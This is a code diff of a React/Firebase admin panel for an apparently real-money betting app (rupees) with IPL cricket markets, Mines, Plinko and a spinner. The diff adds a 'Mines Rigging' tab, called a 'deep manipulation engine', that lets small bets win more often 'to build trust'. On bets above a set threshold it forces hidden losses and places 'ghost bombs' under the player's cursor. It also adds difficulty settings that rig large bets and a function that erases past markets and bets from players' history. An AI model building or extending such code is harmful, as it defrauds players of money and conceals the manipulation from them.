@@ -21,8 +21,8 @@ import {
   where
 } from 'firebase/firestore';
 import { db, auth } from '../firebase';
-import { X, Users, Activity, DollarSign, Settings, Play, Target, ShieldCheck, Save, RotateCcw, ChevronLeft, LayoutDashboard, Trophy, Plus, Check, AlertCircle } from 'lucide-react';
-import { handleFirestoreError, OperationType } from '../AuthContext';
+import { X, Users, Activity, DollarSign, Settings, Play, Target, ShieldCheck, Save, RotateCcw, ChevronLeft, LayoutDashboard, Trophy, Plus, Check, AlertCircle, TrendingUp, Bomb } from 'lucide-react';
+import { handleFirestoreError, OperationType } from '../firebase';
 
 interface UserData {
   id: string;
@@ -36,13 +36,19 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
   const [users, setUsers] = useState<UserData[]>([]);
   const [gameState, setGameState] = useState<any>(null);
   const [loading, setLoading] = useState(true);
-  const [tab, setTab] = useState<'spinner' | 'ipl' | 'system' | 'history' | 'players' | 'requests'>('requests');
+  const [tab, setTab] = useState<'spinner' | 'ipl' | 'system' | 'history' | 'players' | 'requests' | 'mines'>('requests');
   
   // System State
   const [riggingLevel, setRiggingLevel] = useState(0);
   const [houseEdge, setHouseEdge] = useState(1);
+  const [gameDifficulty, setGameDifficulty] = useState<'easy' | 'medium' | 'hard'>('medium');
+  
+  // Mines Specific Rigging
+  const [minesHighBetThreshold, setMinesHighBetThreshold] = useState(20);
+  const [minesRiggingIntensity, setMinesRiggingIntensity] = useState(50); // 0-100%
   const [betHistory, setBetHistory] = useState<any[]>([]);
   const [transactionRequests, setTransactionRequests] = useState<any[]>([]);
+  const [statusMsg, setStatusMsg] = useState('');
 
   // Spinner State
   const [forcedResult, setForcedResult] = useState<string>('');
@@ -56,9 +62,21 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
   const [iplQuestions, setIPLQuestions] = useState<any[]>([]);
   const [newQuestion, setNewQuestion] = useState('');
   const [newOptions, setNewOptions] = useState('');
-  const [newMultiplier, setNewMultiplier] = useState(2);
+  const [optionMultipliers, setOptionMultipliers] = useState<Record<string, number>>({});
   const [isCreatingIPL, setIsCreatingIPL] = useState(false);
   const [isAiSuggesting, setIsAiSuggesting] = useState(false);
+  const [iplLocked, setIplLocked] = useState(false);
+  const [iplBets, setIplBets] = useState<any[]>([]);
+
+  useEffect(() => {
+    // Update option multipliers when options change
+    const options = newOptions.split(',').map(o => o.trim()).filter(o => o !== '');
+    const newMults: Record<string, number> = {};
+    options.forEach(opt => {
+      newMults[opt] = optionMultipliers[opt] || 1.88;
+    });
+    setOptionMultipliers(newMults);
+  }, [newOptions]);
 
   useEffect(() => {
     fetchUsers();
@@ -69,6 +87,9 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
         const data = doc.data();
         setRiggingLevel(data.riggingLevel ?? 0);
         setHouseEdge(data.houseEdge ?? 1);
+        setGameDifficulty(data.gameDifficulty ?? 'medium');
+        setMinesHighBetThreshold(data.minesHighBetThreshold ?? 20);
+        setMinesRiggingIntensity((data.minesRiggingIntensity ?? 0.5) * 100);
       }
     }, (error) => {
       handleFirestoreError(error, OperationType.GET, 'settings/global');
@@ -102,12 +123,27 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
     });
 
     const iplUnsub = onSnapshot(query(collection(db, 'ipl_questions'), orderBy('createdAt', 'desc')), (snap) => {
-      setIPLQuestions(snap.docs.map(d => ({ id: d.id, ...d.data() })).filter((q: any) => q.status !== 'cancelled'));
+      setIPLQuestions(snap.docs.map(d => ({ id: d.id, ...d.data() })).filter((q: any) => q.status !== 'cancelled' && q.status !== 'deleted_by_admin'));
     }, (error) => {
       handleFirestoreError(error, OperationType.LIST, 'ipl_questions');
     });
 
-    return () => { unsub(); iplUnsub(); configUnsub(); historyUnsub(); txUnsub(); };
+    const iplLockUnsub = onSnapshot(doc(db, 'settings', 'ipl'), (doc) => {
+      if (doc.exists()) {
+        setIplLocked(doc.data().locked || false);
+      }
+    });
+
+    const iplBetsUnsub = onSnapshot(query(collection(db, 'ipl_bets'), orderBy('timestamp', 'desc'), limit(100)), (snap) => {
+      setIplBets(snap.docs
+        .map(d => ({ id: d.id, ...d.data() }))
+        .filter((b: any) => b.status !== 'cleared_by_admin')
+      );
+    }, (error) => {
+      handleFirestoreError(error, OperationType.LIST, 'ipl_bets');
+    });
+
+    return () => { unsub(); iplUnsub(); configUnsub(); historyUnsub(); txUnsub(); iplLockUnsub(); iplBetsUnsub(); };
   }, []);
 
   const handleProcessTransaction = async (request: any, action: 'approved' | 'rejected') => {
@@ -130,10 +166,23 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
       await setDoc(doc(db, 'settings', 'global'), {
         riggingLevel,
         houseEdge,
+        gameDifficulty,
+        minesHighBetThreshold,
+        minesRiggingIntensity: minesRiggingIntensity / 100,
         updatedAt: serverTimestamp()
       }, { merge: true });
+      setStatusMsg("System settings updated successfully");
+      setTimeout(() => setStatusMsg(''), 3000);
     } catch (err) {
       handleFirestoreError(err, 'write' as any, 'settings/global');
+    }
+  };
+
+  const toggleIplLock = async () => {
+    try {
+      await setDoc(doc(db, 'settings', 'ipl'), { locked: !iplLocked }, { merge: true });
+    } catch (err) {
+      handleFirestoreError(err, 'write' as any, 'settings/ipl');
     }
   };
 
@@ -150,12 +199,13 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
       await addDoc(collection(db, 'ipl_questions'), {
         question: newQuestion,
         options,
-        multiplier: newMultiplier,
+        optionMultipliers, // Use the new mapping
         status: 'active',
         createdAt: serverTimestamp()
       });
       setNewQuestion('');
       setNewOptions('');
+      setOptionMultipliers({});
     } catch (err) {
       handleFirestoreError(err, 'write' as any, 'ipl_questions');
     } finally {
@@ -171,7 +221,12 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
       if (suggestion) {
         setNewQuestion(suggestion.question);
         setNewOptions(suggestion.options.join(', '));
-        setNewMultiplier(suggestion.multiplier);
+        // Distribute suggested multiplier to all options
+        const mults: Record<string, number> = {};
+        suggestion.options.forEach((opt: string) => {
+          mults[opt] = suggestion.multiplier;
+        });
+        setOptionMultipliers(mults);
       } else {
         alert("AI could not scout a market right now. Try again in a few seconds.");
       }
@@ -195,7 +250,8 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
       const betsSnap = await getDocs(query(collection(db, 'ipl_bets'), where('questionId', '==', questionId), where('status', '==', 'pending')));
       
       const question = iplQuestions.find(q => q.id === questionId);
-      const mult = question?.multiplier || 2;
+      const mults = question?.optionMultipliers || {};
+      const winningMult = mults[correctAnswer] || question?.multiplier || 2;
 
       for (const betDoc of betsSnap.docs) {
         const betData = betDoc.data();
@@ -206,8 +262,8 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
         const userRef = doc(db, 'users', betData.userId);
 
         if (isWin) {
-          const winAmount = betData.amount * mult;
-          await updateDoc(betRef, { status: 'won' });
+          const winAmount = betData.amount * winningMult;
+          await updateDoc(betRef, { status: 'won', settlementMultiplier: winningMult });
           await updateDoc(userRef, { balance: increment(winAmount) });
           
           await addDoc(collection(db, 'history'), {
@@ -216,7 +272,7 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
             game: 'IPL Betting',
             amount: betData.amount,
             wonAmount: winAmount,
-            result: mult,
+            result: winningMult,
             win: true,
             timestamp: serverTimestamp()
           });
@@ -240,6 +296,14 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
     }
   };
 
+  const toggleQuestionLock = async (id: string, currentStatus: boolean) => {
+    try {
+      await updateDoc(doc(db, 'ipl_questions', id), { isLocked: !currentStatus });
+    } catch (err) {
+      handleFirestoreError(err, 'update' as any, `ipl_questions/${id}`);
+    }
+  };
+
   const deleteIPLQuestion = async (id: string) => {
     try {
       await updateDoc(doc(db, 'ipl_questions', id), { status: 'cancelled' });
@@ -256,12 +320,42 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
     }
   };
 
+  const clearPastIPLMarkets = async () => {
+    if (!window.confirm("Are you sure you want to permanently clear all SETTLED and CANCELLED markets? This will also remove them from the players' history and delete associated bet records.")) return;
+    
+    try {
+      const settledSnap = await getDocs(query(collection(db, 'ipl_questions'), where('status', 'in', ['settled', 'cancelled'])));
+      
+      const batchSize = settledSnap.docs.length;
+      if (batchSize === 0) {
+        alert("No past markets to clear.");
+        return;
+      }
+
+      for (const qDoc of settledSnap.docs) {
+        // Mark question as deleted
+        await updateDoc(doc(db, 'ipl_questions', qDoc.id), { status: 'deleted_by_admin' });
+        
+        // Find and delete all bets for this question to "clear" them completely
+        const betsSnap = await getDocs(query(collection(db, 'ipl_bets'), where('questionId', '==', qDoc.id)));
+        for (const betDoc of betsSnap.docs) {
+          await updateDoc(doc(db, 'ipl_bets', betDoc.id), { status: 'cleared_by_admin' });
+        }
+      }
+
+      setStatusMsg(`Cleared ${batchSize} past markets and their bets.`);
+      setTimeout(() => setStatusMsg(''), 3000);
+    } catch (err) {
+      handleFirestoreError(err, 'write' as any, 'clear_past_ipl');
+    }
+  };
+
   const fetchUsers = async () => {
     try {
       const usersSnap = await getDocs(query(collection(db, 'users'), limit(100)));
       setUsers(usersSnap.docs.map(d => ({ id: d.id, ...d.data() } as UserData)));
     } catch (error) {
-      console.error(error);
+      handleFirestoreError(error, OperationType.LIST, 'users');
     } finally {
       setLoading(false);
     }
@@ -440,10 +534,95 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
               >
                 Requests {transactionRequests.length > 0 && <span className="ml-1 bg-white text-black px-1.5 rounded-full text-[8px]">{transactionRequests.length}</span>}
               </button>
+              <button 
+                onClick={() => setTab('mines')}
+                className={`px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all flex-shrink-0 ${tab === 'mines' ? 'bg-[#ff007b] text-white' : 'text-gray-500 hover:text-white'}`}
+              >
+                Mines
+              </button>
            </div>
         </div>
 
-        {tab === 'spinner' ? (
+        {tab === 'mines' ? (
+          <div className="space-y-6">
+             <div className="bg-[#161616] p-8 rounded-[2rem] space-y-8 border border-white/5">
+                <div className="flex items-center gap-3">
+                   <div className="p-3 bg-[#ff007b]/10 rounded-xl">
+                      <Bomb className="w-6 h-6 text-[#ff007b]" />
+                   </div>
+                   <div>
+                      <h2 className="text-sm font-bold uppercase tracking-widest">MINES RIGGING</h2>
+                      <p className="text-[10px] text-gray-500 font-black uppercase tracking-[0.2em] italic">Deep manipulation engine</p>
+                   </div>
+                </div>
+
+                <div className="space-y-6">
+                   <div className="space-y-4">
+                      <label className="text-[10px] text-gray-500 font-black uppercase tracking-widest">Game Difficulty</label>
+                      <div className="flex gap-2">
+                        {(['easy', 'medium', 'hard'] as const).map((level) => (
+                          <button
+                            key={level}
+                            onClick={() => setGameDifficulty(level)}
+                            className={`flex-1 py-3 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all border ${
+                              gameDifficulty === level 
+                                ? 'bg-[#ff007b] text-white border-[#ff007b]' 
+                                : 'bg-black border-white/10 text-gray-500 hover:text-white'
+                            }`}
+                          >
+                            {level}
+                          </button>
+                        ))}
+                      </div>
+                   </div>
+
+                   <div className="grid grid-cols-2 gap-4">
+                      <div className="space-y-2">
+                         <label className="text-[10px] text-gray-500 font-black uppercase tracking-widest">High Bet Min (₹)</label>
+                         <input 
+                            type="number"
+                            value={minesHighBetThreshold}
+                            onChange={(e) => setMinesHighBetThreshold(Number(e.target.value))}
+                            className="w-full bg-black border border-white/10 rounded-xl p-4 text-sm outline-none focus:border-[#ff007b]"
+                         />
+                         <p className="text-[8px] text-gray-600 font-bold uppercase">Bets above this trigger aggressive rigging.</p>
+                      </div>
+                      <div className="space-y-2">
+                         <label className="text-[10px] text-gray-500 font-black uppercase tracking-widest">Rigging Intensity ({minesRiggingIntensity}%)</label>
+                         <input 
+                            type="range"
+                            min="0"
+                            max="100"
+                            value={minesRiggingIntensity}
+                            onChange={(e) => setMinesRiggingIntensity(Number(e.target.value))}
+                            className="w-full h-10 accent-[#ff007b]"
+                         />
+                         <p className="text-[8px] text-gray-600 font-bold uppercase">Probability boost for bombs on high bets.</p>
+                      </div>
+                   </div>
+
+                   <button 
+                    onClick={updateGlobalConfig}
+                    className="w-full bg-[#ff007b] text-white font-black py-4 rounded-xl text-xs uppercase tracking-widest shadow-lg shadow-[#ff007b]/20"
+                   >
+                     Update Mines Logic
+                   </button>
+                </div>
+             </div>
+
+             <div className="bg-[#161616] p-6 rounded-[2rem] border border-white/5 space-y-3">
+                <div className="flex items-center gap-2 text-[#ff007b]">
+                   <AlertCircle className="w-4 h-4" />
+                   <h3 className="text-[10px] font-black uppercase tracking-widest">How it works</h3>
+                </div>
+                <ul className="space-y-2">
+                   <li className="text-[9px] text-gray-500 font-medium leading-relaxed">• SMALL BETS: Users win 20-50% more often to build trust.</li>
+                   <li className="text-[9px] text-gray-500 font-medium leading-relaxed">• LARGE BETS: System triggers "Unknowing Loss" after 4 stars or 3x multiplier.</li>
+                   <li className="text-[9px] text-gray-500 font-medium leading-relaxed">• GHOST BOMBS: The bomb is generated exactly under the user's cursor if rigging triggers.</li>
+                </ul>
+             </div>
+          </div>
+        ) : tab === 'spinner' ? (
           <>
             {/* Round Controls */}
             <div className="bg-[#161616] p-8 rounded-[2rem] space-y-6 border border-white/5">
@@ -555,6 +734,27 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
           </>
         ) : tab === 'ipl' ? (
           <div className="space-y-6">
+            {/* IPL Lock Control */}
+            <div className="bg-[#161616] p-8 rounded-[2rem] border border-white/5 flex items-center justify-between">
+               <div className="flex items-center gap-3">
+                  <div className={`p-3 rounded-xl ${iplLocked ? 'bg-red-500/10' : 'bg-green-500/10'}`}>
+                    <ShieldCheck className={`w-6 h-6 ${iplLocked ? 'text-red-500' : 'text-green-500'}`} />
+                  </div>
+                  <div>
+                    <h2 className="text-sm font-bold uppercase tracking-widest">IPL BETTING STATUS</h2>
+                    <p className={`text-[10px] font-black uppercase tracking-[0.2em] italic ${iplLocked ? 'text-red-500' : 'text-green-500'}`}>
+                      {iplLocked ? 'LOCKED' : 'OPEN'}
+                    </p>
+                  </div>
+               </div>
+               <button 
+                onClick={toggleIplLock}
+                className={`px-6 py-3 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${iplLocked ? 'bg-green-500 text-white shadow-lg shadow-green-500/20' : 'bg-red-500 text-white shadow-lg shadow-red-500/20'}`}
+               >
+                 {iplLocked ? 'UNLOCK BETTING' : 'LOCK BETTING'}
+               </button>
+            </div>
+
             {/* Create IPL Question */}
             <div className="bg-[#161616] p-8 rounded-[2rem] space-y-6 border border-white/5">
                <div className="flex items-center gap-3">
@@ -585,64 +785,104 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
                     </button>
                   </div>
                   <input 
-                    type="text"
-                    placeholder="Options (comma separated: MI, SRH)"
+                    type="text" 
+                    placeholder="Options (comma separated: MI, CSK)" 
                     value={newOptions}
                     onChange={(e) => setNewOptions(e.target.value)}
                     className="w-full bg-black border border-white/10 rounded-xl px-4 py-3 text-sm focus:border-[#ff007b] outline-none"
                   />
-                  <div className="flex gap-4">
-                    <div className="flex-1 space-y-2">
-                       <label className="text-[10px] text-gray-500 font-black uppercase tracking-widest">Multiplier</label>
-                       <input 
-                          type="number"
-                          value={newMultiplier}
-                          onChange={(e) => setNewMultiplier(Number(e.target.value))}
-                          className="w-full bg-black border border-white/10 rounded-xl px-4 py-3 text-sm focus:border-[#ff007b] outline-none"
-                       />
+
+                  {Object.keys(optionMultipliers).length > 0 && (
+                    <div className="grid grid-cols-2 gap-3 p-4 bg-white/5 rounded-2xl border border-white/10">
+                      {Object.keys(optionMultipliers).map(opt => (
+                        <div key={opt} className="space-y-1">
+                          <label className="text-[9px] text-gray-500 font-black uppercase">{opt} Mutliplier</label>
+                          <input 
+                            type="number"
+                            step="0.01"
+                            value={optionMultipliers[opt]}
+                            onChange={(e) => setOptionMultipliers(prev => ({ ...prev, [opt]: Number(e.target.value) }))}
+                            className="w-full bg-black border border-white/10 rounded-lg px-3 py-2 text-xs outline-none focus:border-[#ff007b]"
+                          />
+                        </div>
+                      ))}
                     </div>
-                    <button 
-                      onClick={createIPLQuestion}
-                      disabled={isCreatingIPL}
-                      className="flex-[2] bg-[#ff007b] text-white font-black rounded-xl text-xs uppercase tracking-widest hover:scale-[1.02] active:scale-95 transition-all mt-6"
-                    >
-                      {isCreatingIPL ? 'CREATING...' : 'POST MARKET'}
-                    </button>
-                  </div>
+                  )}
+
+                  <button 
+                    onClick={createIPLQuestion}
+                    disabled={isCreatingIPL}
+                    className="w-full bg-[#ff007b] text-white font-black rounded-xl py-4 text-xs uppercase tracking-widest hover:scale-[1.02] active:scale-95 transition-all"
+                  >
+                    {isCreatingIPL ? 'CREATING...' : 'POST MARKET'}
+                  </button>
                </div>
             </div>
 
             {/* Questions List */}
             <div className="space-y-4">
-               <h3 className="text-xs font-black text-gray-500 uppercase tracking-widest px-4">Live Markets</h3>
-               {iplQuestions.map(q => (
+               <div className="flex items-center justify-between px-4">
+                  <h3 className="text-xs font-black text-gray-500 uppercase tracking-widest">Markets</h3>
+                  <button 
+                    onClick={clearPastIPLMarkets}
+                    className="text-[9px] font-black text-red-500 uppercase tracking-widest border border-red-500/20 px-3 py-1 rounded-lg hover:bg-red-500 hover:text-white transition-all"
+                  >
+                    Clear Past Results
+                  </button>
+               </div>
+               {iplQuestions.map(q => {
+                 const marketBets = iplBets.filter(b => b.questionId === q.id);
+                 const totalVolume = marketBets.reduce((sum, b) => sum + b.amount, 0);
+                 
+                 return (
                  <div key={q.id} className="bg-[#161616] p-6 rounded-[2rem] border border-white/5 space-y-4">
                     <div className="flex items-start justify-between">
                        <div>
                           <h4 className="text-sm font-bold text-white uppercase italic">{q.question}</h4>
-                          <span className={`text-[8px] font-black px-2 py-0.5 rounded uppercase tracking-tighter ${q.status === 'active' ? 'bg-green-500/20 text-green-500' : 'bg-gray-800 text-gray-500'}`}>
-                             {q.status}
-                          </span>
+                          <div className="flex items-center gap-2 mt-1">
+                            <span className={`text-[8px] font-black px-2 py-0.5 rounded uppercase tracking-tighter ${q.status === 'active' ? 'bg-green-500/20 text-green-500' : 'bg-gray-800 text-gray-500'}`}>
+                               {q.status}
+                            </span>
+                            <span className="text-[8px] font-black text-gray-500 uppercase tracking-widest">
+                               Vol: ₹{totalVolume}
+                            </span>
+                          </div>
                        </div>
-                       <button 
-                         onClick={() => deleteIPLQuestion(q.id)}
-                         className="p-2 text-gray-600 hover:text-red-500 transition-colors"
-                       >
-                         <X className="w-4 h-4" />
-                       </button>
+                       <div className="flex items-center gap-2">
+                         <button 
+                           onClick={() => toggleQuestionLock(q.id, q.isLocked || false)}
+                           className={`p-2 rounded-xl transition-all ${q.isLocked ? 'bg-red-500/20 text-red-500' : 'bg-green-500/20 text-green-500'}`}
+                           title={q.isLocked ? "Unlock Market" : "Lock Market"}
+                         >
+                           <ShieldCheck className="w-4 h-4" />
+                         </button>
+                         <button 
+                           onClick={() => deleteIPLQuestion(q.id)}
+                           className="p-2 text-gray-600 hover:text-red-500 transition-colors"
+                         >
+                           <X className="w-4 h-4" />
+                         </button>
+                       </div>
                     </div>
 
                     {q.status === 'active' && (
                       <div className="grid grid-cols-2 gap-2">
-                         {q.options.map((opt: string) => (
-                           <button 
-                             key={opt}
-                             onClick={() => settleIPLQuestion(q.id, opt)}
-                             className="bg-black/50 border border-white/5 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest hover:bg-green-500/20 hover:border-green-500/30 hover:text-green-500 transition-all"
-                           >
-                             SETTLE: {opt}
-                           </button>
-                         ))}
+                         {q.options.map((opt: string, idx: number) => {
+                           const mult = q.optionMultipliers?.[opt] || q.multiplier || 2;
+                           const optionBets = marketBets.filter(b => b.option === opt);
+                           const optionVol = optionBets.reduce((sum, b) => sum + b.amount, 0);
+
+                           return (
+                            <button 
+                              key={`${opt}-${idx}`}
+                              onClick={() => settleIPLQuestion(q.id, opt)}
+                              className="bg-black/50 border border-white/5 py-3 rounded-xl text-[10px] font-black uppercase tracking-widest hover:bg-green-500/20 hover:border-green-500/30 hover:text-green-500 transition-all flex flex-col items-center"
+                            >
+                              <span className="text-gray-400">SETTLE: {opt}</span>
+                              <span className="text-[#ff007b] text-[8px]">{mult}x (₹{optionVol})</span>
+                            </button>
+                           );
+                         })}
                       </div>
                     )}
 
@@ -652,8 +892,25 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
                          <span className="text-[10px] font-black uppercase tracking-widest">Correct: {q.correctAnswer}</span>
                       </div>
                     )}
+
+                    {/* Individual Bets for this market */}
+                    {marketBets.length > 0 && (
+                      <div className="pt-4 border-t border-white/5 space-y-2">
+                        <p className="text-[8px] text-gray-500 font-bold uppercase tracking-widest">Active Individual Bets</p>
+                        <div className="max-h-32 overflow-y-auto space-y-1 pr-2 custom-scrollbar">
+                          {marketBets.map(b => (
+                            <div key={b.id} className="flex items-center justify-between text-[9px] bg-black/40 p-2 rounded-lg border border-white/5">
+                              <span className="text-white font-bold">{b.username}</span>
+                              <span className="text-gray-500">{b.option} @ {b.multiplier}x</span>
+                              <span className="text-[#ff007b] font-black">₹{b.amount}</span>
+                            </div>
+                          ))}
+                        </div>
+                      </div>
+                    )}
                  </div>
-               ))}
+                 );
+               })}
             </div>
           </div>
         ) : tab === 'system' ? (
@@ -682,6 +939,28 @@ export default function AdminPanel({ onClose }: { onClose: () => void }) {
                       />
                       <p className="text-[9px] text-gray-600 font-bold uppercase leading-relaxed">
                         Affects spin logic and Plinko gravity bias. Higher values increase house advantage by pushing results toward low multipliers.
+                      </p>
+                   </div>
+
+                   <div className="space-y-4">
+                      <label className="text-[10px] text-gray-500 font-black uppercase tracking-widest">Game Difficulty (Mines & Plinko)</label>
+                      <div className="flex gap-2">
+                        {(['easy', 'medium', 'hard'] as const).map((level) => (
+                          <button
+                            key={level}
+                            onClick={() => setGameDifficulty(level)}
+                            className={`flex-1 py-3 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all border ${
+                              gameDifficulty === level 
+                                ? 'bg-[#ff007b] text-white border-[#ff007b]' 
+                                : 'bg-black border-white/10 text-gray-500 hover:text-white'
+                            }`}
+                          >
+                            {level}
+                          </button>
+                        ))}
+                      </div>
+                      <p className="text-[9px] text-gray-600 font-bold uppercase leading-relaxed">
+                        Easy: Boosts luck for small bets. Hard: Aggressively rigs large bets (₹20+) to ensure house profit.
                       </p>
                    </div>
 
